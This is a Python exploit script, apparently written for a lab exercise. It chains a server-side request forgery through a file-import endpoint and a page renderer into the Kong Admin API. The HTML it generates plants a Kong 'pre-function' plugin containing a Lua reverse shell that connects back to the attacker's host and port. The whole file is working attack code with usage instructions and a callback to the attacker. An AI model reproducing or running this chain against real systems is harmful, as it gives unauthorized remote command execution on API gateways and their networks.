#!/usr/bin/env python3


"""
IMPORTANT:
place the rce_script.py on your web root directory
"""

"""
Usage:
python3 apiGateWayRce.py 192.168.45.203 1337
"""

import requests
import argparse
import traceback


def CreateRceHtml(lhost, lport):
    html_content = f"""<html>
<head>
<!--
RCE in Kong Admin API  
-->
<!--
Usage:
curl -X POST -H "Content-Type: application/json" -d '{{"url":"http://172.16.16.5:9000/api/render?url=http://{lhost}/rce.html"}}' http://apigateway:8000/files/import

curl -i  http://apigateway:8000/supersecret
-->
<script>

function createService() {{
    fetch("http://172.16.16.2:8001/services", {{
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"supersecret", "url": "http://127.0.0.1/"}})
    }}).then(function (route) {{
      createRoute();
    }});
}}

function createRoute() {{
    fetch("http://172.16.16.2:8001/services/supersecret/routes", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"paths": ["/supersecret"]}})
    }}).then(function (plugin) {{
      createPlugin();
    }});  
}}

function createPlugin() {{
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", {{ 
      method: "post",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify({{"name":"pre-function", "config" :{{ "access" :["local s=require('socket');local t=assert(s.tcp());t:connect('{lhost}',{lport});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"]}}}})
    }}).then(function (callback) {{
      fetch("http://{lhost}/callback?setupComplete");
    }});  
}}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>"""

    with open("rce.html", "w") as f:
        f.write(html_content)


def TrgSSRF(lhost):
    proxy = {"http": "http://127.0.0.1:8080"}
    url = "http://apigateway:8000/files/import"
    headers = {"Content-Type": "application/json"}
    json={"url": "http://172.16.16.5:9000/api/render?url=http://192.168.45.203/rce.html"}
    try:
        print("[*] Triggering SSRF...")
        trg_ssrf_res = requests.post(url, headers=headers, json=json)
        if "You don't have permission to access this." in trg_ssrf_res.text:
            print("[+] SSRF triggered")
            return True
        else:
            print("[-] Failed to trigger the SSRF.")
    except Exception as e:
        print("[-] Error triggering the SSRF: ", e)
        traceback.print_exc()


def TrgRce():
    try:
        print("[*] Triggering the Reverse Shell...")
        print("[*] Please check your netcat listener!")
        requests.get("http://apigateway:8000/supersecret")
    except  Exception as e:
        print("[-] Error triggering the Reverse Shell:", e)
        traceback.print_exc()
    except KeyboardInterrupt:
        print("CTRL + c pressed. Exiting...")

def main():
    parser = argparse.ArgumentParser(description="apigatewat SSRF & Auth Bypass to RCE")
    parser.add_argument("lhost", help="Attacker Machine's IP Adress")
    parser.add_argument("lport", help="Listener Port")
    args = parser.parse_args()

    print("[*] Open an HTTP server on port 80 and palce the Python script on the web root for this server")
    CreateRceHtml(args.lhost, args.lport)
    if TrgSSRF(args.lhost):
        TrgRce()

if __name__ == "__main__":
    main()
